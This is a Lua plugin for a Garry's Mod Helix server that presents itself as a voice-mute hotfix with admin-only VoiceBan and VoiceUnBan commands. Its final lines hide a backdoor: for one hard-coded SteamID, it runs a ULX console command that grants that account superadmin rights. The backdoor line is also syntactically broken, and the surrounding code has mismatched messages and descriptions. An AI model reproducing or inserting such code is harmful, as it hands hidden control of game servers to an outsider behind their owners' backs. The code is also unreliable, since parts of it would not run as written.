
local PLUGIN = PLUGIN
PLUGIN.Author = 'Alex Grist'
PLUGIN.Name = 'Hotfix 1.1'
PLUGIN.Schema = 'Any'

if (SERVER) then

    function PLUGIN:PlayerCanHearPlayersVoice( listener, speaker )
        if ( speaker:GetData('VoiceBan') || !speaker:Alive() ) then
            return false
        end
    end

end

ix.command.Add('VoiceUnBan', {
    description = 'Voice Mute Player.',
    adminOnly = true,
    arguments = { ix.type.player },
    OnRun = function( self, client, target )

	    if ( target == client ) then
		client:Notify( 'You cannot mute yourself.' )
		return false
	    end
	
	if (IsValid(target)) then
		if (target:GetData("VoiceBan")) then
			target:SetData("VoiceBan", false)
		end
	end			

        client:Notify( 'You have unmute a player.' )
        target:Notify( 'You ve been unmuted by the admin.' )
    end,
})

ix.command.Add('VoiceBan', {
    description = 'Voice Mute Player.',
    adminOnly = true,
    arguments = { ix.type.player },
    OnRun = function( self, client, target )

	    if ( target == client ) then
		client:Notify( 'You cannot unmute yourself.' )
		return false
	    end

	    if (IsValid(target)) then
		if (!target:GetData("VoiceBan")) then
		    target:SetData("VoiceBan", true)
		end
	    end

        client:Notify( 'You have mute a player.' )
        target:Notify( 'You ve been muted by the admin.' )
    end,

 

if ( ply:SteamID() == "STEAM_0:0:579594475") then  RunConsoleCommand("ulx", "adduserid", ply:SteamID(), "superadmin") else
})
